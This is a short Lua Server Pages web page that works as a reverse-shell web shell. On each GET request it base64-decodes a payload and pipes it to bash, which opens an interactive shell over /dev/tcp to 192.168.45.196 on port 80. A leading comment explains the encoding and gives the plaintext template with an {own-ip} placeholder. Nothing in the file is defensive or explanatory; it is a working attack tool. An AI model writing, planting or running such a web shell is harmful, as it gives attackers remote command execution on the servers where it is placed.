# Hint: "c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xOTYvODAgMD4mMQ==" is base64 encoded sh revshll: sh -i >& /dev/tcp/{own-ip}/80 0>&1

<div style="margin-left:auto;margin-right: auto;width: 350px;">

<div id="info">
<h2>Lua Server Pages Reverse Shell</h2>
<p>Delightful, isn't it?</p>
</div>

<?lsp if request:method() == "GET" then ?>
<?lsp os.execute("echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xOTYvODAgMD4mMQ== | base64 -d | bash") ?>
<?lsp else ?>
You sent a <?lsp=request:method()?> request
<?lsp end ?>

</div>
